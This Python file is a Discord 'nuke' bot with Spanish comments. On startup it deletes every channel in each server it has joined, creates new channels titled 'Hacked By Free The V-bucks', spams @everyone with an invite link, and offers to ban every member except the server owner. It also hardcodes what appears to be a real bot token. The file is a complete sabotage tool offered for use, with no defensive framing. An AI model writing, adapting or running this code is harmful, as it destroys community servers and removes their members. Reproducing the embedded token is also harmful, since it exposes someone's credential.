import discord
from discord.ext import commands
import asyncio

# Configura el token de tu bot
TOKEN = 'MTIxNDMzMjQwMTUxNDQ1NTEyMQ.GQ4LIa.4nKyLqV5BYe-xgQ7nCd7pELJnf4RlsHsrcuf6M'

# Nombre para los nuevos canales
nuevo_nombre = "Hacked By Free The V-bucks"

# Mensaje a enviar en cada canal de texto
mensaje = "@everyone Hacked By https://discord.com/invite/KN6RfBN"

# Número de mensajes a enviar en cada canal de texto
num_mensajes = 4

# Intents requeridos
intents = discord.Intents.default()

# Crea una instancia del bot con los intents especificados
bot = commands.Bot(command_prefix='!', intents=intents)

# Evento que se activa cuando el bot está listo y conectado
@bot.event
async def on_ready():
    print(f'Conectado como {bot.user}')

    # Itera sobre todos los servidores donde se encuentra el bot
    for guild in bot.guilds:
        # Itera sobre todos los canales del servidor
        for channel in guild.channels:
            # Elimina el canal o la categoría
            await channel.delete()

        print(f'Eliminados todos los canales y categorías en el servidor {guild.name}')

        # Crear canales de voz y de texto de forma simultánea
        channels_to_create = [
            (guild.create_voice_channel, f"{nuevo_nombre} Voz {i}") for i in range(1, 5)
        ] + [
            (guild.create_text_channel, f"{nuevo_nombre} Texto {i}") for i in range(1, 5)
        ]
        await asyncio.gather(*(create_channel(name) for create_channel, name in channels_to_create))

        print(f'Creados los canales de voz y texto en el servidor {guild.name}')

        # Iterar sobre todos los canales de texto creados
        for channel in guild.text_channels:
            # Enviar el mensaje varias veces en cada canal de texto
            for _ in range(num_mensajes):
                await channel.send(mensaje)

            print(f'{num_mensajes} mensajes enviados en el canal de texto {channel.name}')

   # Preguntar si se desea banear a todos los usuarios, excepto al dueño del servidor
    banear = input("¿Deseas banear a todos los usuarios, excepto al dueño del servidor? (s/n): ")
    if banear.lower() == 's':
        # Obtiene al dueño del servidor
        owner = bot.get_guild(bot.guilds[0].id).owner
        # Obtén una lista de todos los miembros del servidor
        members = bot.get_guild(bot.guilds[0].id).members
        # Filtra los miembros para excluir al dueño del servidor
        members_to_ban = [member for member in members if member != owner]
        # Banea a cada miembro de la lista
        for member in members_to_ban:
            try:
                await member.ban(reason="Hacked By https://discord.com/invite/KN6RfBN")
                print(f"{member.name} baneado.")
            except discord.Forbidden:
                print(f"No se pudo banear a {member.name}.")
    else:
        print("Operación cancelada.")

# Ejecuta el bot con el token proporcionado
bot.run(TOKEN)
